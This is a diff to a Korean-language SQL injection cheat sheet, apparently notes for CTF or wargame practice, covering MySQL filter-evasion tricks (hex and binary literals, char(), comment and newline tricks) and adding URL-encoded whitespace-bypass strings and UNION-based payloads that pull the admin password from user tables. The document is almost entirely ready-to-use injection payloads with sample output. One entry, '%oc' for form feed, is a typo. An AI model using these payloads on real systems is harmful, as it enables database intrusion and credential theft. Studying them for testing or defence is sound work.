@@ -1053,7 +1053,7 @@
 
 
 	MYSQL 우회 기법
-		MySQL 진법을 이용한 문자열 검사 우회
+		문자열 검사 우회
 
 			mysql> select 0x6162, 0b110000101100010;
 			/*
@@ -1064,8 +1064,6 @@
 			+--------+-------------------+
 			1 row in set (0.00 sec)
 			*/
-
-		MySQL 함수를 이용한 문자열 검사 우회
 
 			mysql> select char(0x61, 0x62);
 			/*
@@ -1085,8 +1083,6 @@
 			+--------------------------------+
 			*/
 
-		MySQL 가젯을 이용한 문자열 검사 우회
-
 			mysql> select mid(@@version,12,1);
 			/*
 			+---------------------+
@@ -1096,7 +1092,7 @@
 			+---------------------+
 			*/
 
-		MySQL 개행을 이용한 공백 검사 우회
+		공백 검사 우회
 
 			mysql> select
 			    -> 1;
@@ -1108,8 +1104,6 @@
 			+---+
 			*/
 
-		MySQL 주석을 이용한 공백 검사 우회
-
 			mysql> select/**/1;
 			/*
 			+---+
@@ -1118,6 +1112,25 @@
 			| 1 |
 			+---+
 			*/
+
+			Tab : %09
+			no=1%09or%09id='admin'
+			 
+			Line Feed (\n) : %0a
+			no=1%0aor%0aid='admin'
+
+			Carrage Return (\r) : %0d
+			no=1%0dor%0did='admin'
+
+			vertical tab (\v) : %0b
+			form feed (\f) : %oc
+
+			괄호 : ()
+			no=(1)or(id='admin')
+
+			더하기 : +
+			no=1+or+id='admin'
+
 
 		주석구문 실행(/*! */)
 
@@ -1274,6 +1287,8 @@
 	flag 얻기 성공
 		" union select userpassword,1 from users where userid="admin" or "
 		" union select userpassword,1 from users where userid="admin"--
+		' Union Select 0,upw,0 From user Where uid="Admin";--
+		%27%09Union%09Select%090%2Cupw%2C0%09From%09user%09Where%09uid%3D%22Admin%22%3B%2D%2D
 
 	flag 일부정보 얻기 성공
 		' union select length(password)=10 from users where username='admin' -- -
